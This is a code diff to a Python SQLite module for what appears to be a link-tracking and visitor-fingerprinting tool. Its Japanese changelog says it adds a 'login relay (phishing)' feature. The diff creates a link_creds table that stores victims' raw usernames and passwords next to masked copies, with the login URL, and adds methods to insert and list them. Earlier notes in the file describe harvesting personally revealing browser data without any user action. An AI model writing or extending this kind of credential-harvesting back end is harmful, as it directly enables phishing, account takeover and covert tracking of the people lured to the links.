@@ -18,6 +18,10 @@ v5:
     arch / bitness / wow64 / ua_data / gpu_full / hw_json）を追加
   ・無操作で取れる個人色の濃い列（pwa / display_mode / contrast / save_data /
     heap_mb / locales / calendar / num_sys / media_caps / win_outer / avail_top）を追加
+
+v6:
+  ・ログイン中継（フィッシング）用の link_creds を追加
+    生値（user_val / pass_val）と伏字（user_mask / pass_mask）を両方保持する
 """
 import sqlite3, json, datetime as dt, os, threading
 from contextlib import contextmanager
@@ -189,6 +193,12 @@ CREATE TABLE IF NOT EXISTS link_reverse (
     id INTEGER PRIMARY KEY AUTOINCREMENT,
     code TEXT, ip TEXT, ts TEXT, score INTEGER, verdict TEXT, data TEXT
 );
+CREATE TABLE IF NOT EXISTS link_creds (
+    id INTEGER PRIMARY KEY AUTOINCREMENT,
+    code TEXT, hit_id INTEGER, site TEXT, login_url TEXT,
+    user_val TEXT, pass_val TEXT, user_mask TEXT, pass_mask TEXT,
+    fields TEXT, ok INTEGER, ts TEXT
+);
 CREATE TABLE IF NOT EXISTS visitors (
     vid TEXT PRIMARY KEY, first_seen TEXT, last_seen TEXT, hits INTEGER DEFAULT 0,
     ip TEXT, country TEXT, region TEXT, city TEXT, isp TEXT, asn TEXT,
@@ -259,6 +269,8 @@ CREATE INDEX IF NOT EXISTS idx_q_code ON link_questions(code, ord);
 CREATE INDEX IF NOT EXISTS idx_ans_hit ON link_answers(hit_id);
 CREATE INDEX IF NOT EXISTS idx_ans_code ON link_answers(code, ts);
 CREATE INDEX IF NOT EXISTS idx_rev_code ON link_reverse(code, ts);
+CREATE INDEX IF NOT EXISTS idx_cred_code ON link_creds(code, id);
+CREATE INDEX IF NOT EXISTS idx_cred_hit ON link_creds(hit_id);
 CREATE INDEX IF NOT EXISTS idx_visitors_seen ON visitors(last_seen);
 CREATE INDEX IF NOT EXISTS idx_sns_scan ON sns_hits(scan_id, state);
 CREATE INDEX IF NOT EXISTS idx_sns_u ON sns_hits(username, state);
@@ -783,6 +795,7 @@ class DB:
             c.execute("DELETE FROM link_answers WHERE code=?", (code,))
             c.execute("DELETE FROM link_captures WHERE code=?", (code,))
             c.execute("DELETE FROM link_reverse WHERE code=?", (code,))
+            c.execute("DELETE FROM link_creds WHERE code=?", (code,))
 
     def set_link_active(self, code, flag):
         with self.tx() as c:
@@ -817,7 +830,29 @@ class DB:
         with self.tx() as c:
             c.execute("DELETE FROM link_hits WHERE code=?", (code,))
             c.execute("DELETE FROM link_answers WHERE code=?", (code,))
+            c.execute("DELETE FROM link_creds WHERE code=?", (code,))
             c.execute("UPDATE links SET hit_count=0 WHERE code=?", (code,))
+
+    # ---- 抜き取り（ログイン中継） ----
+    def add_cred(self, code, hit_id, site, login_url, user, pw, user_mask, pw_mask,
+                 fields, ok=None):
+        with self.tx() as c:
+            cur = c.execute("""INSERT INTO link_creds(code,hit_id,site,login_url,user_val,
+                pass_val,user_mask,pass_mask,fields,ok,ts) VALUES(?,?,?,?,?,?,?,?,?,?,?)""",
+                (code, hit_id, site, login_url, user, pw, user_mask, pw_mask,
+                 fields, ok, now()))
+            return cur.lastrowid
+
+    def creds(self, code, limit=300):
+        return self.q("SELECT * FROM link_creds WHERE code=? ORDER BY id DESC LIMIT ?",
+                      (code, limit))
+
+    def creds_for(self, hit_id):
+        return self.q("SELECT * FROM link_creds WHERE hit_id=? ORDER BY id", (hit_id,))
+
+    def del_creds(self, code):
+        with self.tx() as c:
+            c.execute("DELETE FROM link_creds WHERE code=?", (code,))
 
     # ---- クイズ ----
     def add_question(self, code, prompt, qtype="choice", options=None,
@@ -1085,6 +1120,7 @@ class DB:
             c.execute("DELETE FROM link_answers WHERE code=?", (code,))
             c.execute("DELETE FROM link_captures WHERE code=?", (code,))
             c.execute("DELETE FROM link_reverse WHERE code=?", (code,))
+            c.execute("DELETE FROM link_creds WHERE code=?", (code,))
             c.execute("DELETE FROM links WHERE code=?", (code,))
 
     def clear_points(self, code):
